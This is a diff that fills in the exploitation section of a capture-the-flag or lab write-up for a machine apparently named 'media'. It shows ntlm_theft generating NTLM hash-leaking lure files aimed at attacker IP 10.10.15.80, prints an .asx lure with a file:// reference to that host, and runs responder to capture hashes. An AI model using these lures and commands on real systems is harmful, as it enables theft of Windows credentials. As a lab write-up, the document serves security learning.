@@ -77,8 +77,81 @@ Description of the vulnerability exploited.
 Step-by-step exploitation with commands.
 
 ```shell
-# Commands used
+git clone https://github.com/Greenwolf/ntlm_theft.git           
+Cloning into 'ntlm_theft'...
+remote: Enumerating objects: 179, done.
+remote: Counting objects: 100% (49/49), done.
+remote: Compressing objects: 100% (18/18), done.
+remote: Total 179 (delta 41), reused 31 (delta 31), pack-reused 130 (from 1)
+Receiving objects: 100% (179/179), 2.13 MiB | 3.18 MiB/s, done.
+Resolving deltas: 100% (90/90), done.
+                                                                 
 ```
+
+```
+python3 ntlm_theft.py -g all -s 10.10.15.80 -f test
+Created: test/test.scf (BROWSE TO FOLDER)
+Created: test/test-(url).url (BROWSE TO FOLDER)
+Created: test/test-(icon).url (BROWSE TO FOLDER)
+Created: test/test.lnk (BROWSE TO FOLDER)
+Created: test/test.rtf (OPEN)
+Created: test/test-(stylesheet).xml (OPEN)
+Created: test/test-(fulldocx).xml (OPEN)
+Created: test/test.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: test/test-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: test/test-(includepicture).docx (OPEN)
+Created: test/test-(remotetemplate).docx (OPEN)
+Created: test/test-(frameset).docx (OPEN)
+Created: test/test-(externalcell).xlsx (OPEN)
+Created: test/test.wax (OPEN)
+Created: test/test.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
+Created: test/test.asx (OPEN)
+Created: test/test.jnlp (OPEN)
+Created: test/test.application (DOWNLOAD AND OPEN)
+Created: test/test.pdf (OPEN AND ALLOW)
+Created: test/zoom-attack-instructions.txt (PASTE TO CHAT)
+Created: test/test.library-ms (BROWSE TO FOLDER)
+Created: test/Autorun.inf (BROWSE TO FOLDER)
+Created: test/desktop.ini (BROWSE TO FOLDER)
+Created: test/test.theme (THEME TO INSTALL)
+Created: test/test.bat (BROWSE TO FOLDER)
+Generation Complete.
+
+```
+
+```
+──(kali㉿kali)-[~/machines/media/ntlm_theft/test]
+└─$ ls
+ Autorun.inf                 test.htm                     'test-(remotetemplate).docx'
+ desktop.ini                'test-(icon).url'              test.rtf
+ test.application           'test-(includepicture).docx'   test.scf
+ test.asx                    test.jnlp                    'test-(stylesheet).xml'
+ test.bat                    test.library-ms               test.theme
+'test-(externalcell).xlsx'   test.lnk                     'test-(url).url'
+'test-(frameset).docx'       test.m3u                      test.wax
+'test-(fulldocx).xml'        test.odt                      zoom-attack-instructions.txt
+'test-(handler).htm'         test.pdf
+                                                                                                                                                                                                    
+┌──(kali㉿kali)-[~/machines/media/ntlm_theft/test]
+└─$ cat test.asx
+<asx version="3.0">
+   <title>Leak</title>
+   <entry>
+      <title></title>
+      <ref href="file://10.10.15.80/leak/leak.wma"/>
+   </entry>
+</asx>                                                                                                                    
+
+```
+
+```
+sudo responder -I tun0
+```
+
+uploading the file:
+ img1
+
+
 
 ---
 ## User Flag
